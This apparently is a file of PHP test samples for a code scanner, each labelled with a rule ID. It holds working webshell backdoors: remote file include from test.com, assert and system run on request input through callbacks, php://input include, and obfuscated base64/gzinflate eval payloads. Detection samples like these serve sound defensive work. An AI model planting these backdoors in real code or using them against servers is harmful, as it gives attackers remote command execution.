//cvi-360002
include "sss.jpg";
include("sss_tmp");
require_once "http://www.test.com/sss.php";

//扫不出来....
$a="http://www.test.com/sss.php";
require_once $a;

//cvi-360016
filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
//cvi-360017 
$op=array('options' => 'assert');
filter_var($_REQUEST['pass'], FILTER_CALLBACK, $op);

//cvi-360018 
mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');
//cvi-360019 
$e = "\ise";
$data = mb_ereg_replace("/[^A-Za-z0-9\.\-]/","",$data,$e);

//cvi-360022
ini_set('allow_url_include, 1'); // Allow url inclusion in this script
include('php://input');

//cvi-360023   
GIF87a<?php
BM<?php

//cvi-360026  
$cb= 'system';
ob_start($cb);
echo $_GET[c];
ob_end_flush();

//cvi-360028  
eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));
eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));


//cvi-360034 
$_POST['sa']($_POST['sb']);
?>
